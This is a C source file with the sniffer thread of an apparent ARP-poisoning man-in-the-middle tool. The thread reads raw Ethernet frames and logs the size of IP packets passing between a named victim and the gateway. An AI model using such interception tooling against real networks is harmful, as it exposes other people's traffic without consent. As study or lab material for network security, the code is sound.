#include "sniffer.h"
#include "poisoning.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netpacket/packet.h>   // AF_PACKET, struct sockaddr_ll
#include <net/ethernet.h>       // ETH_P_ALL, struct ether_header


void *sniffer_thread(void *arg)
{
    unsigned char buffer[2048];
    mitm_ctx *ctx = (mitm_ctx *)arg;

    while (1)
    {
        int bytes_received = recvfrom(ctx->raw_sock, buffer, sizeof(buffer),
                                      0, NULL, NULL );

        if (bytes_received == -1)
        {
            perror("ERROR ! (recvfrom - sniffer)");
            continue;
        }

        if ((size_t)bytes_received < sizeof(struct ether_header))
            continue;

        struct ether_header *eth = (struct ether_header *)buffer;

        if (eth->ether_type != htons(ETH_P_IP))
            continue;

        if (memcmp(eth->ether_shost, ctx->victim_mac, ETH_ALEN) == 0 &&
            memcmp(eth->ether_dhost, ctx->gateway_mac, ETH_ALEN) == 0)
        {
            printf("[SNIFFER] Victim -> Gateway (%d bytes)\n", bytes_received);
            continue;
        }

        if (memcmp(eth->ether_shost, ctx->gateway_mac, ETH_ALEN) == 0 && 
            memcmp(eth->ether_dhost, ctx->victim_mac, ETH_ALEN) == 0)
        {
            printf("[SNIFFER] Gateway -> Victim (%d bytes)\n", bytes_received);
            continue;
        }



    }

    return NULL;
}
